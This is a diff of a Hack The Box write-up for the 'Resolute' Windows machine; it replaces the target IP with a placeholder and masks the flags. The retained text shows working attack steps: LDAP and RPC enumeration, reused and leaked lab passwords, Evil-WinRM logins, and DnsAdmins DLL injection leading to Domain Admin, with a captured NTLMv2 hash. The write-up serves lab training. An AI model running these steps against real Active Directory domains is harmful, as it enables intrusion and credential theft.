@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Resolute
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/resolute-infocard.png)
-
 A medium-difficulty Windows box that was fairly straightforward.  Privilege escalation required going through two different users and taking advantage of Windows domain group permissions.  It ended with a privilege escalation route that required a simple dll injection, and a bit of quick reaction.
 
 ## Useful Skills and Tools
@@ -45,13 +43,13 @@ A medium-difficulty Windows box that was fairly straightforward.  Privilege esca
 
 ### Nmap scan
 
-First, I started my enumeration with an nmap scan of `10.10.10.169`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
+First, I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ nmap -sC -sV -oA resolute 10.10.10.169
+zweilos@kalimaa:~/htb/resolute$ nmap -sC -sV -oA resolute <YOUR_IP>
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-23 08:21 EDT
-Nmap scan report for 10.10.10.169
+Nmap scan report for <YOUR_IP>
 Host is up (0.15s latency).
 Not shown: 989 closed ports
 PORT STATE SERVICE VERSION
@@ -109,7 +107,7 @@ From these results we can see there are a lot of ports open! Since ports `88 - k
 Since I had so many options, I decided to start by enumerating Active Directory through LDAP using `ldapsearch`. This command is built into many linux distros and returned a wealth of information. I snipped out huge chunks of the output in order to reduce information overload as most of it was not particularly interesting in this case.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ ldapsearch -H ldap://10.10.10.169:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
+zweilos@kalimaa:~/htb/resolute$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
 
 dn: DC=megabank,DC=local
 objectClass: top
@@ -1189,7 +1187,7 @@ There was no interesting information in the other users, but I made a list of th
 Next I used `rpcclient` to validate the information I found through LDAP using the `enumdomusers` and `queryuser <rid>` RPC commands.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ rpcclient -U "" -N 10.10.10.169
+zweilos@kalimaa:~/htb/resolute$ rpcclient -U "" -N <YOUR_IP>
 
 rpcclient $> enumdomusers
 
@@ -1258,7 +1256,7 @@ Hmm...so the user `marko` has no home drive or profile path, and has never logge
 I tried using the creds for `marko` to enumerate SMB but got nothing back. I then tested his password with the users `ryan` and `melanie` and was able to get a share listing with `melanie:Welcome123!`Thank you password reuse!
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie -L //10.10.10.169/
+zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie -L //<YOUR_IP>/
 Enter WORKGROUP\melanie's password: 
 
         Sharename       Type      Comment
@@ -1274,7 +1272,7 @@ SMB1 disabled -- no workgroup available
 Next, I tried connecting to each of the shares. We only see the standard Windows domain shares, nothing out of the ordinary. Only `NETLOGON` and `SYSVOL` allowed `melanie` to log in, but neither contained anything useful. `SYSVOL` had more folders to browse through, but still nothing useful.
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie //10.10.10.169/NETLOGON Welcome123!
+zweilos@kalimaa:~/htb/resolute$ smbclient -U melanie //<YOUR_IP>/NETLOGON Welcome123!
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Wed Sep 25 09:28:21 2019
@@ -1288,7 +1286,7 @@ smb: \> ls
 Since `melanie` is a member of the `Remote Management Users` group, I tried to log in through Windows Remote Management using the `Evil-WinRM` tool, which can be found at [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
+zweilos@kalimaa:~/htb/resolute$ evil-winrm -i <YOUR_IP> -u melanie -p 'Welcome123!'
 
 Evil-WinRM shell v2.3
 
@@ -1307,7 +1305,6 @@ User Name        SID
 ================ ===============================================
 megabank\melanie S-1-5-21-1392959593-3013219662-3596683436-10101
 
-
 GROUP INFORMATION
 -----------------
 
@@ -1323,7 +1320,6 @@ NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandato
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -1333,7 +1329,6 @@ SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
-
 USER CLAIMS INFORMATION
 -----------------------
 
@@ -1342,7 +1337,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 
 *Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
-fc92144f24a8510dd36ac3aa890611ee
+****
 ```
 
 ### user.txt
@@ -1374,7 +1369,7 @@ PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.tx
 It seems as if the user `ryan` used the `net use` command to connect to an external share, leaving his credentials `ryan:Serv3r4Admin4cc123!` in the Powershell transcripts! We can now try to login as `ryan` using `Evil-WinRM` since he is also a member of the `Remote Management Users` group.
 
 ```bash
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
+zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -1393,7 +1388,6 @@ User Name     SID
 ============= ==============================================
 megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105
 
-
 GROUP INFORMATION
 -----------------
 
@@ -1411,7 +1405,6 @@ MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -1420,7 +1413,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -1460,7 +1452,7 @@ I then hosted my dll on an SMB share so I could access it from the Windows machi
 After logging back in as `ryan` with `Evil-WinRM`,
 
 ```text
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
+zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -1515,13 +1507,13 @@ Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corpo
 [*] Config file parsed
 [*] Config file parsed
 [*] Config file parsed
-[*] Incoming connection (10.10.10.169,52825)
+[*] Incoming connection (<YOUR_IP>,52825)
 [*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
 [*] User RESOLUTE\RESOLUTE$ authenticated successfully
 [*] RESOLUTE$::MEGABANK:4141414141414141:b7cf9e97aaa2dc6eb6c445bfd31b78c0:010100000000000080dc5b96b140d601f055aec715c614f90000000001001000730066004e005600480079007a00620003001000730066004e005600480079007a00620002001000420074004e006b004b0047007400760004001000420074004e006b004b004700740076000700080080dc5b96b140d60106000400020000000800300030000000000000000000000000400000ec955b51be4dc45f746b5b6c2c304b5c83f6fde057b51098f9837f196eb5368e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200350033000000000000000000
 [*] Disconnecting Share(1:SHARE)
 [*] Handle: 'ConnectionResetError' object is not subscriptable
-[*] Closing down connection (10.10.10.169,52825)
+[*] Closing down connection (<YOUR_IP>,52825)
 [*] Remaining connections []
 ```
 
@@ -1532,7 +1524,7 @@ In order for the new permissions to take effect I had to log out of the user and
 
 Info: Exiting with code 0
 
-zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
+zweilos@kalimaa:~/htb/resolute$ evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -1553,7 +1545,6 @@ User Name     SID
 ============= ==============================================
 megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105
 
-
 GROUP INFORMATION
 -----------------
 
@@ -1573,7 +1564,6 @@ MEGABANK\DnsAdmins                              Alias            S-1-5-21-139295
 MEGABANK\Denied RODC Password Replication Group Alias            S-1-5-21-1392959593-3013219662-3596683436-572  Mandatory group, Enabled by default, Enabled group, Local Group
 NT AUTHORITY\NTLM Authentication                Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level            Label            S-1-16-12288
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1607,7 +1597,6 @@ SeTimeZonePrivilege                       Change the time zone                  
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
 
-
 USER CLAIMS INFORMATION
 -----------------------
 
@@ -1622,9 +1611,5 @@ After escalating to `Domain Admin` it was simple to find the root flag on the Ad
 
 ```text
 *Evil-WinRM* PS C:\Users\ryan\Documents> cat ../../Administrator/Desktop/root.txt
-ebdd1e01af7b2f1a53a1ef844a5d465c
+****
 ```
-
-Thanks to [`egre55`](https://www.hackthebox.eu/home/users/profile/1190) for a fun and easy Windows box. I did still learn some new things while going though this one.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
